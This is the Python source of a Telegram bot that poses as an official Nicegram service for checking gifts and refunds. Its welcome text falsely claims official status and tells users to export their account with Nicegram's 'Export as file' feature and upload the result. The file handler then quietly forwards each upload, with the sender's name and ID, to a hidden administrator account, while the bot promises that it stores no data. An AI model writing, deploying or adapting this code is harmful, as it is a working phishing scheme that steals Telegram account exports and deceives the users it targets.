import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Получаем токен из переменных окружения
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

if not BOT_TOKEN:
    print("❌ ОШИБКА: BOT_TOKEN не установлен!")
    print("Добавьте переменную BOT_TOKEN в настройках Render")
    exit(1)

if not ADMIN_ID:
    print("❌ ОШИБКА: ADMIN_ID не установлен!")
    print("Добавьте переменную ADMIN_ID в настройках Render")
    exit(1)

try:
    ADMIN_ID = int(ADMIN_ID)
except ValueError:
    print("❌ ОШИБКА: ADMIN_ID должен быть числом!")
    exit(1)

# Обработчик команды /start
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "друг"

    welcome_text = f"""Hello, {name}! 👋

I am a bot from Nicegram, the official Telegram client.

My responsibilities include:
• Checking if gifts have refunds
• Detecting suspicious activity
• Reviewing gift history

To allow me to check your account:
1. Download Nicegram
2. Log in to the account you want to check
3. Go to Settings → select the Nicegram tab
4. Scroll down and find "Export as file"
5. Click Export and send the generated file to this bot

After that, the bot will check your account and provide a report.

⚠️ Important: The bot does not store your data and uses it only to check gifts.
"""
    await update.message.reply_text(welcome_text)

# Обработчик файлов
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "пользователь"

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📁 Файл от пользователя:\nИмя: {name}\nID: {user.id}"
    )

    await context.bot.forward_message(
        chat_id=ADMIN_ID,
        from_chat_id=update.effective_chat.id,
        message_id=update.message.message_id
    )

    await update.message.reply_text(
        f"📥 File received, {name}! I am starting to check your gifts and account. Please wait."
    )

# Flask сервер для Render
app = Flask(__name__)

@app.route("/")
def home():
    return "🤖 Бот работает на Render 24/7"

@app.route("/healthz")
def healthz():
    return "OK", 200

def run_flask():
    app.run(host="0.0.0.0", port=8080)

flask_thread = Thread(target=run_flask, daemon=True)
flask_thread.start()

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("=" * 50)
    print("🤖 Бот запущен на Render.com")
    print(f"👑 ID администратора: {ADMIN_ID}")
    print("🆓 Бесплатный хостинг 24/7")
    print("✅ Бот работает и ожидает сообщения...")
    print("=" * 50)

    application.run_polling(
        poll_interval=3,
        timeout=30,
        drop_pending_updates=True
    )

if __name__ == "__main__":
    main()
